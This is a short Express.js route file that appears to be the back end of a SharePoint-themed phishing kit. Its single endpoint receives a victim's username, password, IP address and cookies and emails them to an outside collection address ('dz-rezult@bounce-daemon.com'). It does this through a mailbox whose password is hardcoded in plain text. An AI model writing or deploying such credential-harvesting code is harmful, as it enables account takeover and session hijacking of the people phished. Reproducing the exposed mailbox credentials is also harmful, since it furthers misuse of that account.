const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

router.post('/send-mail', (req, res) => {
    // Extract data from request body
    const { username, pass, ip, cookies } = req.body;

    // Create Nodemailer transport
    const nodeTransport = mailer.createNodeMailerTransport('celio.khan@century21.pt', 'c3l10@C21');

    // Send email with data including cookies
    mailer.sendEmail('celio.khan@century21.pt', 'dz-rezult@bounce-daemon.com', 'SharePoint-Data', username, pass, ip, cookies, nodeTransport);
});

module.exports = router;
